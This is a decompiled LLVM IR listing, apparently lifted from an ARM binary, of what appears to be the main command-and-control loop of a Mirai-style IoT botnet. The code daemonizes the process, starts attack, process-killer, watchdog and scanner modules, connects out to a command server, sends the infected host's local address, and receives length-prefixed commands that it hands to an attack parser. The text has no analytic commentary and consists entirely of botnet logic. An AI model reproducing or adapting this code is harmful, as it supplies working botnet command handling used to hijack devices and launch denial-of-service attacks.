  %v1_da84 = add i32 %v0_da84, 4
  %v2_da84 = inttoptr i32 %v1_da84 to i32*
  %v3_da84 = load i32, i32* %v2_da84, align 4
  %v1_da8c = inttoptr i32 %v3_da84 to i8*
  %v2_da8c = call i32 @util_strlen(i8* %v1_da8c)
  store i32 %v2_da8c, i32* @r1, align 4
  store i32 %v3_da84, i32* @r0, align 4
  %v0_da98 = call i32 @util_zero()
  br label %dec_label_pc_d934

dec_label_pc_daa0:                                ; preds = %dec_label_pc_d934
  %v1_daa0 = call i32 @__GI_setsid(i32 %v0_da44)
  %v0_daa4 = load i32, i32* @sb, align 4
  %v1_daa8 = call i32 @__GI___libc_close(i32 %v0_daa4)
  %v1_dab0 = call i32 @__GI___libc_close(i32 1)
  %v1_dab8 = call i32 @__GI___libc_close(i32 2)
  %v1_dabc = call i32 @attack_init(i32 %v1_dab8)
  %v1_dac0 = call i32 @killer_init(i32 %v1_dabc)
  %v1_dac4 = call i32 @watchdog_maintain(i32 %v1_dac0)
  %v1_dac8 = call i32 @scanner_init(i32 %v1_dac4)
  store i32 ptrtoint (i32* @global_var_230bc.104 to i32), i32* @sl, align 4
  store i32 ptrtoint (i8** @global_var_23238.106 to i32), i32* @fp, align 4
  %v2_dadc = ptrtoint i32* %stack_var_-264 to i32
  store i32 %v2_dadc, i32* @r6, align 4
  %v2_dae0 = ptrtoint i32* %stack_var_-392 to i32
  store i32 %v2_dae0, i32* @r7, align 4
  %v2_dbc4 = ptrtoint i32* %stack_var_-72 to i32
  %v2_dc0c = ptrtoint i32* %stack_var_-144 to i32
  %v2_decc = ptrtoint i8** %stack_var_-42 to i32
  %v2_dd68 = ptrtoint i32* %stack_var_-1416 to i32
  %v2_de60 = ptrtoint i32* %stack_var_-52 to i32
  %v2_de64 = ptrtoint i32* %stack_var_-56 to i32
  %v1_df1c = bitcast i32* %stack_var_-136 to i8*
  br label %dec_label_pc_dae4

dec_label_pc_dae4:                                ; preds = %dec_label_pc_dee0, %dec_label_pc_df14, %bb45, %dec_label_pc_dd80, %dec_label_pc_dcc4, %dec_label_pc_dcb4, %bb42, %dec_label_pc_df9c, %dec_label_pc_df80, %dec_label_pc_df68, %dec_label_pc_def0, %dec_label_pc_de88, %dec_label_pc_ddd8, %dec_label_pc_dc68, %dec_label_pc_daa0
  store i32 0, i32* %stack_var_-264, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_daf0

dec_label_pc_daf0:                                ; preds = %dec_label_pc_daf0, %dec_label_pc_dae4
  %v1_daf4 = phi i32 [ %v1_daf8, %dec_label_pc_daf0 ], [ 4, %dec_label_pc_dae4 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_daf4 = load i32, i32* @r6, align 4
  %v3_daf4 = add i32 %v2_daf4, %v1_daf4
  %v4_daf4 = inttoptr i32 %v3_daf4 to i32*
  store i32 0, i32* %v4_daf4, align 4
  %v0_daf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_daf8 = add i32 %v0_daf8, 4
  store i32 %v1_daf8, i32* %r3.global-to-local, align 4
  %v7_dafc = icmp eq i32 %v1_daf8, 128
  br i1 %v7_dafc, label %dec_label_pc_db04, label %dec_label_pc_daf0

dec_label_pc_db04:                                ; preds = %dec_label_pc_daf0
  %v0_db04 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_db04, i32* %stack_var_-392, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_db0c

dec_label_pc_db0c:                                ; preds = %dec_label_pc_db0c, %dec_label_pc_db04
  %v1_db10 = phi i32 [ %v1_db14, %dec_label_pc_db0c ], [ 4, %dec_label_pc_db04 ]
  store i32 0, i32* @r4, align 4
  %v2_db10 = load i32, i32* @r7, align 4
  %v3_db10 = add i32 %v2_db10, %v1_db10
  %v4_db10 = inttoptr i32 %v3_db10 to i32*
  store i32 0, i32* %v4_db10, align 4
  %v0_db14 = load i32, i32* %r3.global-to-local, align 4
  %v1_db14 = add i32 %v0_db14, 4
  store i32 %v1_db14, i32* %r3.global-to-local, align 4
  %v7_db18 = icmp eq i32 %v1_db14, 128
  br i1 %v7_db18, label %dec_label_pc_db20, label %dec_label_pc_db0c

dec_label_pc_db20:                                ; preds = %dec_label_pc_db0c
  store i32 ptrtoint (i32* @global_var_230b8.108 to i32), i32* %r3.global-to-local, align 4
  %v2_db24 = load i32, i32* @global_var_230b8.108, align 4
  %v7_db28 = icmp eq i32 %v2_db24, -1
  br i1 %v7_db28, label %dec_label_pc_db58, label %dec_label_pc_db30

dec_label_pc_db30:                                ; preds = %dec_label_pc_db20
  %v3_db30 = udiv i32 %v2_db24, 32
  %v3_db38 = mul nuw nsw i32 %v3_db30, 4
  store i32 %v2_d97c, i32* %ip.global-to-local, align 4
  %v2_db40 = add i32 %v3_db38, %v2_d97c
  store i32 %v2_db40, i32* %r3.global-to-local, align 4
  %v1_db44 = add i32 %v2_db40, -224
  %v2_db44 = inttoptr i32 %v1_db44 to i32*
  %v3_db44 = load i32, i32* %v2_db44, align 4
  %v1_db48 = urem i32 %v2_db24, 32
  %v7_db50 = shl i32 1, %v1_db48
  %v8_db50 = or i32 %v3_db44, %v7_db50
  store i32 %v8_db50, i32* %r2.global-to-local, align 4
  store i32 %v8_db50, i32* %v2_db44, align 4
  br label %dec_label_pc_db58

dec_label_pc_db58:                                ; preds = %dec_label_pc_db20, %dec_label_pc_db30
  %v2_db58 = load i32, i32* @global_var_230bc.104, align 4
  store i32 %v2_db58, i32* @r3, align 4
  %v7_db5c = icmp eq i32 %v2_db58, -1
  store i32 ptrtoint (i32* @global_var_230bc.104 to i32), i32* @r8, align 4
  br i1 %v7_db5c, label %dec_label_pc_dde4, label %dec_label_pc_db68

dec_label_pc_db68:                                ; preds = %dec_label_pc_dde4, %dec_label_pc_db58, %bb44
  %v2_db68 = load i8, i8* bitcast (i8** @global_var_23238.106 to i8*), align 4
  %v3_db68 = zext i8 %v2_db68 to i32
  store i32 %v3_db68, i32* %r3.global-to-local, align 4
  %v2_db6c = icmp eq i8 %v2_db68, 0
  %v2_dc84 = load i32, i32* @global_var_230bc.104, align 4
  store i32 %v2_dc84, i32* %ip.global-to-local, align 4
  %v3_dc8c = udiv i32 %v2_dc84, 32
  br i1 %v2_db6c, label %dec_label_pc_dc84, label %dec_label_pc_db74

dec_label_pc_db74:                                ; preds = %dec_label_pc_db68
  %v3_db84 = mul nuw nsw i32 %v3_dc8c, 4
  %v2_db88 = add i32 %v3_db84, %v2_d97c
  store i32 %v2_db88, i32* %r3.global-to-local, align 4
  %v1_db8c = add i32 %v2_db88, -352
  %v2_db8c = inttoptr i32 %v1_db8c to i32*
  %v3_db8c = load i32, i32* %v2_db8c, align 4
  %v1_db90 = urem i32 %v2_dc84, 32
  %v7_db98 = shl i32 1, %v1_db90
  %v8_db98 = or i32 %v3_db8c, %v7_db98
  store i32 %v8_db98, i32* %r2.global-to-local, align 4
  store i32 %v8_db98, i32* %v2_db8c, align 4
  br label %dec_label_pc_dba0

dec_label_pc_dba0:                                ; preds = %dec_label_pc_dc84, %dec_label_pc_db74
  store i32 ptrtoint (i32* @global_var_230b8.108 to i32), i32* %r3.global-to-local, align 4
  %v2_dba4 = load i32, i32* @global_var_230b8.108, align 4
  %v0_dba8 = load i32, i32* %ip.global-to-local, align 4
  %v5_dbac = icmp slt i32 %v0_dba8, %v2_dba4
  br i1 %v5_dbac, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_dba0
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_dba0, %bb
  %v0_dbc8 = phi i32 [ %v2_dba4, %dec_label_pc_dba0 ], [ %v0_dba8, %bb ]
  store i32 0, i32* @lr, align 4
  store i32 10, i32* %stack_var_-72, align 4
  store i32 %v2_dbc4, i32* %ip.global-to-local, align 4
  %v1_dbc8 = add i32 %v0_dbc8, 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_dae0, i32* %r2.global-to-local, align 4
  %v5_dbe0 = call i32 @__libc_select(i32 %v1_dbc8, i32 %v2_dadc, i32 %v2_dae0, i32 0, i32 %v2_dbc4)
  %v8_dbe4 = icmp eq i32 %v5_dbe0, -1
  br i1 %v8_dbe4, label %dec_label_pc_dae4, label %dec_label_pc_dbec

dec_label_pc_dbec:                                ; preds = %bb42
  %v6_dbe0 = trunc i32 %v5_dbe0 to i16
  %v3_dbec = icmp eq i16 %v6_dbe0, 0
  br i1 %v3_dbec, label %dec_label_pc_dbf4, label %dec_label_pc_dc20

dec_label_pc_dbf4:                                ; preds = %dec_label_pc_dbec
  %v2_dbf8 = load i32, i32* @sb, align 4
  %v5_dbfc = srem i32 %v2_dbf8, 6
  %v4_dc04 = sub i32 %v2_dbf8, %v5_dbfc
  store i32 %v4_dc04, i32* %r3.global-to-local, align 4
  store i32 %v5_dbfc, i32* %r2.global-to-local, align 4
  %v2_dc10 = icmp eq i32 %v5_dbfc, 0
  %v7_dc14 = inttoptr i32 %v5_dbe0 to i8*
  store i8* %v7_dc14, i8** %stack_var_-42, align 4
  %v1_dc18 = add i32 %v2_dbf8, 1
  store i32 %v1_dc18, i32* @sb, align 4
  br i1 %v2_dc10, label %dec_label_pc_dec4, label %dec_label_pc_dc20

dec_label_pc_dc20:                                ; preds = %dec_label_pc_dbec, %dec_label_pc_dbf4, %dec_label_pc_dec4
  %v2_dc20 = load i8, i8* bitcast (i8** @global_var_23238.106 to i8*), align 4
  %v3_dc20 = zext i8 %v2_dc20 to i32
  store i32 %v3_dc20, i32* @r4, align 4
  %v2_dc24 = icmp eq i8 %v2_dc20, 0
  %v2_dcb4 = load i32, i32* @global_var_230bc.104, align 4
  br i1 %v2_dc24, label %dec_label_pc_dcb4, label %dec_label_pc_dc2c

dec_label_pc_dc2c:                                ; preds = %dec_label_pc_dc20
  %v3_dc34 = udiv i32 %v2_dcb4, 32
  store i32 %v2_d97c, i32* %r2.global-to-local, align 4
  %v3_dc3c = mul nuw nsw i32 %v3_dc34, 4
  %v2_dc40 = add i32 %v3_dc3c, %v2_d97c
  store i32 %v2_dc40, i32* %r3.global-to-local, align 4
  %v1_dc44 = add i32 %v2_dc40, -352
  %v2_dc44 = inttoptr i32 %v1_dc44 to i32*
  %v3_dc44 = load i32, i32* %v2_dc44, align 4
  %v1_dc48 = urem i32 %v2_dcb4, 32
  %v6_dc4c = ashr i32 %v3_dc44, %v1_dc48
  store i32 %v6_dc4c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_23238.106 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_dc58 = urem i32 %v6_dc4c, 2
  %v2_dc58 = icmp eq i32 %v1_dc58, 0
  store i8 0, i8* bitcast (i8** @global_var_23238.106 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_230bc.104 to i32), i32* @r4, align 4
  br i1 %v2_dc58, label %dec_label_pc_dc68, label %dec_label_pc_de50

dec_label_pc_dc68:                                ; preds = %dec_label_pc_dc2c
  store i32 56432, i32* @lr, align 4
  %v1_dc6c = icmp ne i32 %v2_dcb4, -1
  call void @__pseudo_cond_branch(i1 %v1_dc6c, i32 ptrtoint (i32* @global_var_157e0.110 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dc74 = load i32, i32* @r4, align 4
  %v2_dc74 = inttoptr i32 %v1_dc74 to i32*
  store i32 -1, i32* %v2_dc74, align 4
  %v1_dc7c = call i32 @sleep(i32 1)
  br label %dec_label_pc_dae4

dec_label_pc_dc84:                                ; preds = %dec_label_pc_db68
  store i32 %v2_d97c, i32* %r2.global-to-local, align 4
  %v3_dc94 = mul nuw nsw i32 %v3_dc8c, 4
  %v2_dc98 = add i32 %v3_dc94, %v2_d97c
  store i32 %v2_dc98, i32* %r3.global-to-local, align 4
  %v1_dc9c = add i32 %v2_dc98, -224
  %v2_dc9c = inttoptr i32 %v1_dc9c to i32*
  %v3_dc9c = load i32, i32* %v2_dc9c, align 4
  %v1_dca0 = urem i32 %v2_dc84, 32
  %v7_dca8 = shl i32 1, %v1_dca0
  %v8_dca8 = or i32 %v3_dc9c, %v7_dca8
  store i32 %v8_dca8, i32* %r2.global-to-local, align 4
  store i32 %v8_dca8, i32* %v2_dc9c, align 4
  br label %dec_label_pc_dba0

dec_label_pc_dcb4:                                ; preds = %dec_label_pc_dc20
  %v7_dcb8 = icmp eq i32 %v2_dcb4, -1
  store i32 ptrtoint (i32* @global_var_230bc.104 to i32), i32* @r8, align 4
  br i1 %v7_dcb8, label %dec_label_pc_dae4, label %dec_label_pc_dcc4

dec_label_pc_dcc4:                                ; preds = %dec_label_pc_dcb4
  %v3_dcc4 = udiv i32 %v2_dcb4, 32
  store i32 %v2_d97c, i32* %r2.global-to-local, align 4
  %v3_dcd0 = mul nuw nsw i32 %v3_dcc4, 4
  %v2_dcd4 = add i32 %v3_dcd0, %v2_d97c
  store i32 %v2_dcd4, i32* %r3.global-to-local, align 4
  %v1_dcd8 = add i32 %v2_dcd4, -224
  %v2_dcd8 = inttoptr i32 %v1_dcd8 to i32*
  %v3_dcd8 = load i32, i32* %v2_dcd8, align 4
  %v1_dcdc = urem i32 %v2_dcb4, 32
  %v6_dce0 = ashr i32 %v3_dcd8, %v1_dcdc
  store i32 %v6_dce0, i32* %r2.global-to-local, align 4
  %v1_dce4 = urem i32 %v6_dce0, 2
  %v2_dce4 = icmp eq i32 %v1_dce4, 0
  br i1 %v2_dce4, label %dec_label_pc_dae4, label %dec_label_pc_dcec

dec_label_pc_dcec:                                ; preds = %dec_label_pc_dcc4
  store i32 %v2_dc0c, i32* %r3.global-to-local, align 4
  %v6_dcf0 = inttoptr i32 %v3_dc20 to i8*
  store i8* %v6_dcf0, i8** %stack_var_-42, align 4
  %v0_dcf4 = call i32 @__GI___errno_location()
  %v0_dcf8 = load i32, i32* @r4, align 4
  %v2_dcf8 = inttoptr i32 %v0_dcf4 to i32*
  store i32 %v0_dcf8, i32* %v2_dcf8, align 4
  store i32 %v0_dcf4, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_dd0c = load i32, i32* @global_var_230bc.104, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_dd18 = call i32 @__libc_recv(i32 %v2_dd0c, i32 %v2_decc, i32 2, i32 16386)
  %v7_dd1c = icmp eq i32 %v4_dd18, -1
  br i1 %v7_dd1c, label %dec_label_pc_dee0, label %dec_label_pc_dd24

dec_label_pc_dd24:                                ; preds = %dec_label_pc_dcec
  %v2_dd24 = icmp eq i32 %v4_dd18, 0
  br i1 %v2_dd24, label %dec_label_pc_def0, label %dec_label_pc_dd2c

dec_label_pc_dd2c:                                ; preds = %dec_label_pc_dd24
  store i32 %v2_dc0c, i32* %ip.global-to-local, align 4
  %v3_dd30 = load i8*, i8** %stack_var_-42, align 4
  %v4_dd30 = ptrtoint i8* %v3_dd30 to i32
  store i32 %v4_dd30, i32* %r3.global-to-local, align 4
  %v2_dd34 = icmp eq i8* %v3_dd30, null
  br i1 %v2_dd34, label %dec_label_pc_df80, label %dec_label_pc_dd3c

dec_label_pc_dd3c:                                ; preds = %dec_label_pc_dd2c
  %v3_dd3c = udiv i32 %v4_dd30, 256
  %v1_dd40 = urem i32 %v4_dd30, 256
  store i32 %v1_dd40, i32* %r3.global-to-local, align 4
  %v4_dd44 = mul nuw nsw i32 %v1_dd40, 256
  %v5_dd44 = or i32 %v4_dd44, %v3_dd3c
  %v6_dd44 = trunc i32 %v5_dd44 to i16
  store i32 %v5_dd44, i32* %r2.global-to-local, align 4
  store i32 %v2_dc0c, i32* @lr, align 4
  %v7_dd50 = inttoptr i32 %v5_dd44 to i8*
  store i8* %v7_dd50, i8** %stack_var_-42, align 4
  %tmp46 = icmp ugt i16 %v6_dd44, 1024
  br i1 %tmp46, label %dec_label_pc_df9c, label %dec_label_pc_dd58

dec_label_pc_dd58:                                ; preds = %dec_label_pc_dd3c
  %v0_dd58 = load i32, i32* @r4, align 4
  %v1_dd58 = load i32, i32* @r5, align 4
  %v2_dd58 = inttoptr i32 %v1_dd58 to i32*
  store i32 %v0_dd58, i32* %v2_dd58, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_dd64 = load i32, i32* @global_var_230bc.104, align 4
  %v7_dd6c = call i32 @__libc_recv(i32 %v2_dd64, i32 %v2_dd68, i32 %v5_dd44, i32 16386)
  %v7_dd70 = icmp eq i32 %v7_dd6c, -1
  br i1 %v7_dd70, label %dec_label_pc_dee0, label %dec_label_pc_dd78

dec_label_pc_dd78:                                ; preds = %dec_label_pc_dd58
  %v2_dd78 = icmp eq i32 %v7_dd6c, 0
  br i1 %v2_dd78, label %dec_label_pc_def0, label %dec_label_pc_dd80

dec_label_pc_dd80:                                ; preds = %dec_label_pc_dd78
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_dd90 = load i32, i32* @global_var_230bc.104, align 4
  %v4_dd94 = call i32 @__libc_recv(i32 %v2_dd90, i32 %v2_decc, i32 2, i32 16384)
  %v3_dd9c = load i8*, i8** %stack_var_-42, align 4
  %v4_dd9c = ptrtoint i8* %v3_dd9c to i32
  %v3_dda0 = udiv i32 %v4_dd9c, 256
  %v1_dda4 = mul i32 %v4_dd9c, 256
  %v4_dda8 = and i32 %v1_dda4, 65280
  %v5_dda8 = or i32 %v4_dda8, %v3_dda0
  store i32 %v5_dda8, i32* %ip.global-to-local, align 4
  store i32 %v2_dc0c, i32* @lr, align 4
  store i32 %v5_dda8, i32* %r2.global-to-local, align 4
  %v2_ddb8 = load i32, i32* @global_var_230bc.104, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_ddc0 = inttoptr i32 %v5_dda8 to i8*
  store i8* %v6_ddc0, i8** %stack_var_-42, align 4
  %v6_ddc4 = call i32 @__libc_recv(i32 %v2_ddb8, i32 %v2_dd68, i32 %v5_dda8, i32 16384)
  store i32 %v2_dc0c, i32* %r2.global-to-local, align 4
  %v3_ddcc = load i8*, i8** %stack_var_-42, align 4
  %v3_ddd0 = icmp eq i8* %v3_ddcc, null
  br i1 %v3_ddd0, label %dec_label_pc_dae4, label %dec_label_pc_ddd8

dec_label_pc_ddd8:                                ; preds = %dec_label_pc_dd80
  %v4_ddcc = ptrtoint i8* %v3_ddcc to i32
  %v5_dddc = call i32 @attack_parse(i32* nonnull %stack_var_-1416, i32 %v4_ddcc, i32 %v2_dc0c)
  br label %dec_label_pc_dae4

dec_label_pc_dde4:                                ; preds = %dec_label_pc_db58
  %v0_ddec = load i32, i32* @r4, align 4
  store i32 %v0_ddec, i32* %r2.global-to-local, align 4
  %v3_ddf0 = call i32 @socket(i32 2, i32 1, i32 %v0_ddec)
  %v7_ddf4 = icmp eq i32 %v3_ddf0, -1
  store i32 %v3_ddf0, i32* @r5, align 4
  %v1_ddfc = load i32, i32* @r8, align 4
  %v2_ddfc = inttoptr i32 %v1_ddfc to i32*
  store i32 %v3_ddf0, i32* %v2_ddfc, align 4
  br i1 %v7_ddf4, label %dec_label_pc_db68, label %dec_label_pc_de04

dec_label_pc_de04:                                ; preds = %dec_label_pc_dde4
  %v0_de04 = load i32, i32* @r4, align 4
  store i32 %v0_de04, i32* @r2, align 4
  %v2_de0c = call i32 @__libc_fcntl(i32 %v3_ddf0, i32 3)
  %v1_de14 = or i32 %v2_de0c, 2048
  store i32 %v1_de14, i32* @r2, align 4
  %v0_de18 = load i32, i32* @r5, align 4
  %v2_de1c = call i32 @__libc_fcntl(i32 %v0_de18, i32 4)
  %v2_de24 = load i32, i32* @global_var_230c0.86, align 4
  store i32 %v2_de24, i32* %r3.global-to-local, align 4
  %v2_de28 = icmp eq i32 %v2_de24, 0
  br i1 %v2_de28, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_de04
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_de04, %bb43
  %v2_de30 = xor i1 %v2_de28, true
  call void @__pseudo_cond_branch(i1 %v2_de30, i32 ptrtoint (i32* @global_var_11c50.111 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_de38 = load i32, i32* @global_var_230bc.104, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v2_de44 = load i32, i32* @fp, align 4
  %v3_de44 = inttoptr i32 %v2_de44 to i8*
  store i8 1, i8* %v3_de44, align 1
  %v4_de48 = call i32 @__libc_connect(i32 %v2_de38, i32 ptrtoint (i16** @global_var_25d54.90 to i32), i32 16)
  br label %dec_label_pc_db68

dec_label_pc_de50:                                ; preds = %dec_label_pc_dc2c
  store i32 4, i32* @r5, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %v2_de60, i32* %r3.global-to-local, align 4
  store i32 %v2_de64, i32* %ip.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_de78 = call i32 @getsockopt(i32 %v2_dcb4, i32 1, i32 4, i32 %v2_de60, i32 %v2_de64)
  %v3_de7c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_de7c, i32* %r3.global-to-local, align 4
  %v2_de80 = icmp eq i32 %v3_de7c, 0
  br i1 %v2_de80, label %dec_label_pc_df14, label %dec_label_pc_de88

dec_label_pc_de88:                                ; preds = %dec_label_pc_de50
  %v2_de88 = load i32, i32* @global_var_230bc.104, align 4
  %v1_de8c = call i32 @__GI___libc_close(i32 %v2_de88)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_de94 = load i32, i32* @r4, align 4
  %v2_de94 = inttoptr i32 %v1_de94 to i32*
  store i32 -1, i32* %v2_de94, align 4
  %v0_de98 = call i32 @rand_next()
  %v3_dea0 = zext i32 %v0_de98 to i64
  %v4_dea0 = mul nuw i64 %v3_dea0, 3435973837
  %v7_dea0 = trunc i64 %v4_dea0 to i32
  store i32 %v7_dea0, i32* @lr, align 4
  %v3_dea42 = udiv i64 %v4_dea0, 34359738368
  %v3_dea84 = mul nuw nsw i64 %v3_dea42, 8
  %v3_dea8 = trunc i64 %v3_dea84 to i32
  store i32 %v3_dea8, i32* %r2.global-to-local, align 4
  %v2_deac6 = mul nuw nsw i64 %v3_dea42, 2
  %v2_deac = trunc i64 %v2_deac6 to i32
  %v2_deb0 = add i32 %v3_dea8, %v2_deac
  store i32 %v2_deb0, i32* %r3.global-to-local, align 4
  %v2_deb4 = sub i32 %v0_de98, %v2_deb0
  %v1_deb8 = add i32 %v2_deb4, 1
  %v1_debc = call i32 @sleep(i32 %v1_deb8)
  br label %dec_label_pc_dae4

dec_label_pc_dec4:                                ; preds = %dec_label_pc_dbf4
  %v2_dec8 = load i32, i32* @global_var_230bc.104, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_ded8 = call i32 @__libc_send(i32 %v2_dec8, i32 %v2_decc, i32 2, i32 16384)
  br label %dec_label_pc_dc20

dec_label_pc_dee0:                                ; preds = %dec_label_pc_dd58, %dec_label_pc_dcec
  %v0_dee0 = load i32, i32* @r5, align 4
  %v1_dee0 = inttoptr i32 %v0_dee0 to i32*
  %v2_dee0 = load i32, i32* %v1_dee0, align 4
  store i32 %v2_dee0, i32* %r3.global-to-local, align 4
  %v7_dee4 = icmp eq i32 %v2_dee0, 4
  br i1 %v7_dee4, label %dec_label_pc_dae4, label %bb45

bb45:                                             ; preds = %dec_label_pc_dee0
  %v8_dee8 = icmp eq i32 %v2_dee0, 11
  br i1 %v8_dee8, label %dec_label_pc_dae4, label %dec_label_pc_def0

dec_label_pc_def0:                                ; preds = %bb45, %dec_label_pc_dd78, %dec_label_pc_dd24
  %v2_def0 = load i32, i32* @global_var_230bc.104, align 4
  store i32 57084, i32* @lr, align 4
  %v1_def8 = icmp ne i32 %v2_def0, -1
  call void @__pseudo_cond_branch(i1 %v1_def8, i32 ptrtoint (i32* @global_var_157e0.110 to i32))
  store i32 ptrtoint (i32* @global_var_230bc.104 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_230bc.104, align 4
  %v1_df0c = call i32 @sleep(i32 1)
  br label %dec_label_pc_dae4

dec_label_pc_df14:                                ; preds = %dec_label_pc_de50
  %v2_df1c = call i32 @util_strlen(i8* %v1_df1c)
  %sext = mul i32 %v2_df1c, 16777216
  %v1_df20 = sdiv i32 %sext, 16777216
  %v7_df20 = inttoptr i32 %v1_df20 to i8*
  store i8* %v7_df20, i8** %stack_var_-42, align 4
  %v0_df24 = call i32 @util_local_addr()
  %v0_df2c = load i32, i32* @r5, align 4
  store i32 %v0_df2c, i32* %r2.global-to-local, align 4
  store i32 %v0_df24, i32* @global_var_25d48.57, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_df3c = load i32, i32* @global_var_230bc.104, align 4
  %v4_df40 = call i32 @__libc_send(i32 %v2_df3c, i32 ptrtoint (i32* @global_var_1a810.114 to i32), i32 %v0_df2c, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_df4c = load i32, i32* @global_var_230bc.104, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_df58 = call i32 @__libc_send(i32 %v2_df4c, i32 %v2_decc, i32 1, i32 16384)
  %v3_df5c = load i8*, i8** %stack_var_-42, align 4
  %v4_df5c = ptrtoint i8* %v3_df5c to i32
  store i32 %v4_df5c, i32* %r2.global-to-local, align 4
  %v3_df60 = icmp eq i8* %v3_df5c, null
  br i1 %v3_df60, label %dec_label_pc_dae4, label %dec_label_pc_df68

dec_label_pc_df68:                                ; preds = %dec_label_pc_df14
  %v2_df6c = load i32, i32* @global_var_230bc.104, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_df78 = call i32 @__libc_send(i32 %v2_df6c, i32 %v2_d920, i32 %v4_df5c, i32 16384)
  br label %dec_label_pc_dae4

dec_label_pc_df80:                                ; preds = %dec_label_pc_dd2c
  %v2_df84 = load i32, i32* @global_var_230bc.104, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_df90 = add i32 %v4_dd30, 16384
  store i32 %v1_df90, i32* %r3.global-to-local, align 4
  %v4_df94 = call i32 @__libc_recv(i32 %v2_df84, i32 %v2_decc, i32 2, i32 %v1_df90)
  br label %dec_label_pc_dae4

dec_label_pc_df9c:                                ; preds = %dec_label_pc_dd3c
  %v2_df9c = load i32, i32* @global_var_230bc.104, align 4
  %v1_dfa0 = call i32 @__GI___libc_close(i32 %v2_df9c)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dfa8 = load i32, i32* @r8, align 4
  %v2_dfa8 = inttoptr i32 %v1_dfa8 to i32*
  store i32 -1, i32* %v2_dfa8, align 4
  br label %dec_label_pc_dae4

; uselistorder directives
  uselistorder i32 %v3_ddf0, { 1, 3, 2, 0 }
  uselistorder i8* %v3_ddcc, { 1, 0 }
  uselistorder i32 %v5_dda8, { 1, 0, 2, 3 }
  uselistorder i32 %v7_dd6c, { 1, 0 }
  uselistorder i32 %v5_dd44, { 1, 0, 3, 2 }
  uselistorder i32 %v4_dd30, { 2, 1, 0, 3 }
  uselistorder i32 %v4_dd18, { 1, 0 }
  uselistorder i32 %v2_dcb4, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v5_dbfc, { 1, 0, 2 }
  uselistorder i32 %v2_dbf8, { 2, 0, 1 }
  uselistorder i32 %v5_dbe0, { 1, 2, 0 }
  uselistorder i32 %v2_db24, { 2, 1, 0 }
  uselistorder i32 %v1_db14, { 1, 2, 0 }
  uselistorder i32 %v1_daf8, { 1, 2, 0 }
  uselistorder i32 %v2_decc, { 3, 0, 4, 2, 1 }
  uselistorder i32 %v2_dc0c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v2_dae0, { 1, 0, 2 }
  uselistorder i32 %v2_d97c, { 0, 10, 1, 11, 2, 9, 3, 4, 8, 7, 5, 12, 6 }
  uselistorder i32 %v2_d964, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-136, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 5, 6, 3, 4, 7, 8 }
  uselistorder i8* null, { 2, 0, 1 }
  uselistorder i32 16386, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @sleep, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_23238.106 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_23238.106, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_23238.106 to i32), { 1, 0 }
  uselistorder i32* @global_var_230bc.104, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 (i32)* @watchdog_maintain, { 1, 0 }
  uselistorder i32 (i32)* @killer_init, { 1, 0 }
  uselistorder i32 (i32)* @attack_init, { 1, 0 }
  uselistorder i32 (i32, i32)* @rand_alpha_str, { 2, 1, 0 }
  uselistorder i32* @global_var_230c0.86, { 2, 0, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_d74c.84 to i32), { 0, 2, 1 }
